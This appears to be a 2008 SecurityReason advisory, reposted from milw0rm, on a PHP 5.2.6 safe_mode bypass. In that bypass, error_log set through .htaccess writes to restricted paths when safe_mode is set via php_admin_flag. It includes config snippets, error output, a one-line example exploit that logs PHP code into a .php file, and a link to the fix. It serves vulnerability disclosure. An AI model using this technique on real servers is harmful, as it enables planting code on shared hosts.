@@ -1,0 +1,93 @@
+[ SecurityReason.com PHP 5.2.6 (error_log) safe_mode bypass ]
+
+Author: Maksymilian Arciemowicz (cXIb8O3)
+securityreason.com
+Date:
+- - Written: 10.11.2008
+- - Public: 20.11.2008
+
+SecurityReason Research
+SecurityAlert Id: 57
+
+CWE: CWE-264
+SecurityRisk: Medium
+
+Affected Software: PHP 5.2.6
+Advisory URL: http://securityreason.com/achievement_securityalert/57
+Vendor: http://www.php.net
+
+- --- 0.Description ---
+PHP is an HTML-embedded scripting language. Much of its syntax is borrowed from C, Java and Perl 
+with a couple of unique PHP-specific features thrown in. The goal of the language is to allow web 
+developers to write dynamically generated pages quickly.
+
+error_log
+
+They allow you to define your own error handling rules, as well as modify the way the errors can 
+be logged. This allows you to change and enhance error reporting to suit your needs.
+
+- --- 0. error_log const. bypassed by php_admin_flag ---
+The main problem is between using safe_mode in global mode
+
+php.ini­:
+safe_mode = On
+
+and declaring via php_admin_flag
+
+<Directory "/www">
+...
+	php_admin_flag safe_mode On
+</Directory>
+
+When we create some php script in /www/ and try call to:
+
+ini_set("error_log", "/hack/");
+
+or in /www/.htaccess
+
+php_value error_log "/hack/bleh.php"
+
+
+Result:
+
+Warning: Unknown: SAFE MODE Restriction in effect. The script whose uid is 80 is not allowed to access /hack/ owned by uid 1001 in Unknown on line 0
+
+Warning: ini_set() [function.ini-set]: SAFE MODE Restriction in effect. The script whose uid is 80 is not allowed to access /hack/ owned by uid 1001 in /www/phpinfo.php on line 4
+
+
+It was for safe_mode declared in php.ini. But if we use
+
+php_admin_flag safe_mode On 
+
+in httpd.conf, we will get only
+
+Warning: ini_set() [function.ini-set]: SAFE MODE Restriction in effect. The script whose uid is 80 is not allowed to access /hack/ owned by uid 1001 in /www/phpinfo.php on line 4
+
+syntax in .htaccess
+
+php_value error_log "/hack/blehx.php"
+
+is allowed and bypass safe_mode.
+
+example exploit:
+error_log("<?php phpinfo(); ?>", 0);
+
+- --- 2. How to fix ---
+Fixed in CVS
+
+http://cvs.php.net/viewvc.cgi/php-src/NEWS?revision=1.2027.2.547.2.1315&view=markup
+
+Note:
+Do not use safe_mode as a main safety.
+
+ --- 3. Greets ---
+sp3x Infospec schain p_e_a pi3
+
+- --- 4. Contact ---
+Author: SecurityReason [ Maksymilian Arciemowicz ( cXIb8O3 ) ]
+Email: cxib [at] securityreason [dot] com
+GPG: http://securityreason.pl/key/Arciemowicz.Maksymilian.gpg
+http://securityreason.com
+http://securityreason.pl
+
+# milw0rm.com [2008-11-20]
